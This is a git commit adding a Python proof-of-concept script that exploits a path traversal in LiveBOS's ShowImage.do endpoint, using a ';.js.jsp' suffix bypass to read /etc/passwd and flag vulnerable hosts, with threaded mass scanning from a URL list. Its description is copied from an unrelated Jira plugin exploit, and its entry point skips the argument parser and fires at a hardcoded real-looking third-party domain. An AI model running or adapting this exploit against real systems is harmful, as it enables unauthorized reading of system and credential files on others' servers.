6e4d673a041fe2d3f90bc0f1a2c21ea13f845893
d0143 <87455598+d0143@users.noreply.github.com>
2023-09-11 23:27:27 +0800

    Add files via upload

---
+++ livebos.py
@@ -0,0 +1,43 @@
+#-*- coding: utf-8 -*-
+import argparse,sys,requests
+from multiprocessing.dummy import Pool
+requests.packages.urllib3.disable_warnings()
+
+headers={
+    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
+}
+
+def poc(target):
+
+    url = target+"/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd"
+    try:
+        res = requests.get(url,headers=headers,verify=False,timeout=5).text
+        if "root" in res :
+            print(f"[+] {target} is vulnable!")
+        else:
+            print(f"[+] {target} is not vulnable!")
+    except:
+        pass
+
+
+def main():
+    parser = argparse.ArgumentParser(description='STAGIL Navigation for Jira - Menu & Themes plugin unauthenticated download')
+    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
+    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
+    args = parser.parse_args()
+    if args.url and not args.file:
+        poc(args.url)
+    elif not args.url and args.file:
+        url_list=[]
+        with open(args.file,"r",encoding="utf-8") as f:
+            for url in f.readlines():
+                url_list.append(url.strip().replace("\n",""))
+        mp = Pool(100)
+        mp.map(poc, url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+if __name__ == '__main__':
+    poc("https://jira.dilax.com")
